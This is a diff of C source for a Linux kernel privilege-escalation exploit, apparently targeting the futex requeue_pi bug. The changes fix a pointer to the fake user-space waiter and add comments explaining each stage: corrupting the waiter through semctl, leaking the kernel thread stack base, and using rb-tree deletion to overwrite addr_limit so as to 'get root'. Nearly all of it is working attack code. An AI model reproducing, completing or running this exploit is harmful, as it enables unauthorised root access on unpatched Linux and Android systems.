@@ -205,7 +205,7 @@ int main(int argc, char **argv){
 
 	sleep(1);
 
-
+	// make space that is writable by the kernel.
 	if((fake_userspace_waiter = mmap((void*)KERNABLE, sizeof(struct rb_node), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED){
 		perror("mmap");
 	}
@@ -215,19 +215,23 @@ int main(int argc, char **argv){
 
 	overwrite_waiter = (struct rt_mutex_waiter*) (sem_values+WAITER_OVERWRITE_OFFSET/2);
 
-	overwrite_waiter->tree_entry.rb_right = (struct rb_node *)KERNABLE;
+	overwrite_waiter->tree_entry.rb_right = (struct rb_node *)fake_userspace_waiter;
 	overwrite_waiter->tree_entry.rb_left = 0;
 	overwrite_waiter->tree_entry.__rb_parent_color = 1;
 
 	sem_values[0] = 0xffff;	// make the syscall return asap, this check happens after copying
 
 	destfutex = 0;
+
+	// make the bugged requeue_pi call. this starts the ger thread,
+	// and overwrites the waiter through semctl.
 	if(futex_cmp_requeue_pi(&destfutex, 0, &destfutex, 1, 0, 0) < 0){
 		perror("bugged futex_cmp_requeue_pi"); 
 	}
 
 	usleep(500000);
 
+	// trigger delete-insert of waiter node.
 	prio = 15;
 	if (pthread_create(&l1, NULL, prio_thread, &prio) != 0) {
 			perror("pthread_create\n");
@@ -235,25 +239,40 @@ int main(int argc, char **argv){
 
 	usleep(500000);
 
+        // at this point, our fake waiter's left points to the kernel_waiter,
+        // hence giving us a kernel stack address. we need this later to overwrite 
+        // addr_limit.
 	kernel_waiter = (struct rt_mutex_waiter*)fake_userspace_waiter->tree_entry.rb_left;
 	tbase = (unsigned long)kernel_waiter & 0xffffffffffffe000;
 
 	printf("found thread stack base: 0x%lx\n",tbase);
 
-	fake_userspace_waiter->tree_entry.rb_right = NULL;
-	fake_userspace_waiter->tree_entry.rb_left = NULL;
-
+	// delete is done as follows:
+	// node->parent->right = node->right;
+	// note that (tbase+24)->right is addr_limit. so, after the delete,
+	// we now have addr_limit writable. see blog post as to why I used tbase+40
+	// to overwrite addr_limit.
 	overwrite_waiter->tree_entry.rb_right = (struct rb_node*)(tbase+40);
 	overwrite_waiter->tree_entry.rb_left = 0;
 	overwrite_waiter->tree_entry.__rb_parent_color = tbase+24;
 
+	// the kernel waiter is reinserted through fake_userspace_waiter.
+	// so we set it NULL to prevent a double insert (since rb_right is 
+        // currently the kernel waiter) preventing all kinds of weird behaviour.
+	fake_userspace_waiter->tree_entry.rb_right = NULL;
+	fake_userspace_waiter->tree_entry.rb_left = NULL;
+
 	proceed_to_overwrite = 1;
 	usleep(1000);
+
+	// trigger delete-insert of waiter node again.
 	prio = 14;
 	if (pthread_create(&l2, NULL, prio_thread, &prio) != 0) {
 			perror("pthread_create\n");
 	}
 	usleep(500000);
+
+	// proceed to overwrite addr_limit and get root, etc.
 	proceed_to_overwrite = 1;
 
 	pthread_join(w1,NULL);
